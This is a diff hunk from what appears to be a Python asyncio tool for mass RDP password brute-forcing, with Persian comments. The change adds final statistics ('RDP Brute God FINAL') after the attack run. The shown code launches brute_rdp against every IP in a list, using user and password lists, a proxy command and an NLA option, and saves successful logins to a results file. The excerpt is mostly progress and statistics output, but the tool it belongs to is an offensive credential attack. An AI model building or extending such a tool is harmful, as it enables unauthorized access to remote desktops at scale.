@@ -78,13 +78,17 @@ async def main():
     sem = asyncio.Semaphore(MAX_WORKERS)
     loop = asyncio.get_event_loop()
 
-    # فیکس نهایی: periodic_stats async هست، مستقیم create_task می‌کنیم
+    # آمار لحظه‌ای از اول تا آخر
     loop.create_task(periodic_stats(stats, lock, cpu_proc, stats["start_time"]))
 
     tasks = [brute_rdp(ip, sem, USERS, PASSWORD_LIST, PROXY_CMD, args.auto_nla, results_file, stats, lock) for ip in all_ips]
     await asyncio.gather(*tasks, return_exceptions=True)
 
-    print(f"\n\n[+] Brute complete!")
+    # آخرین آمار نهایی (حتی بعد از تموم شدن بروت)
+    elapsed = time.time() - stats["start_time"]
+    speed = stats["scanned"] / elapsed if elapsed > 0 else 0
+    print(f"\n\n[RDP Brute God FINAL] Scanned: {stats['scanned']:,}/{stats['total']:,} | Success: {stats['success']:,} | Avg Speed: {speed:,.0f} ips/s")
+    print(f"[+] Brute complete!")
     print(f"    Successes → {results_file}")
 
 signal.signal(signal.SIGINT, lambda s,f: os._exit(0))
